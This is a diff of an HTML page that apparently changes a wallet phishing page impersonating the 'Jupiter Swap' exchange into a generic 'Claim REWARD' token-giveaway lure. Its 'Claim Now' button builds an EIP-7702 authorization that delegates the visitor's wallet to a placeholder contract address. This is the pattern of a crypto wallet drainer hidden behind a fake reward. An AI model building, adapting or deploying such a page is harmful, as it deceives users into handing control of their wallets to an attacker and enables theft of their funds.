@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jupiter Swap</title>
+    <title>Claim REWARD</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -55,16 +55,16 @@
 </head>
 <body>
     <div class="card">
-        <div class="logo">Jupiter</div>
-        <div class="amount">700</div>
-        <div class="sub">Swaptokens</div>
+        <div class="logo">Reward Claim</div>
+        <div class="amount">150 REWARD</div>
+        <div class="sub">Claim your tokens</div>
         
         <div class="info">
             <span class="info-icon">🔐</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">CONTRACT_ADDRESS_HERE</span></span>
         </div>
         
-        <button class="btn btn-primary" id="claimBtn"> Get It</button>
+        <button class="btn btn-primary" id="claimBtn">Claim Now</button>
         
         <div class="status" id="status"></div>
     </div>
@@ -121,10 +121,7 @@
                     authorizationList: [{
                         chainId: CHAIN_ID,
                         address: CONTRACT,
-                        nonce: '0x0',
-                        yParity: '0x0',
-                        r: '0x0000000000000000000000000000000000000000000000000000000000000000',
-                        s: '0x0000000000000000000000000000000000000000000000000000000000000000'
+                        nonce: '0x0'
                     }]
                 };
 
@@ -146,4 +143,4 @@
         });
     </script>
 </body>
-  </html>
+</html>
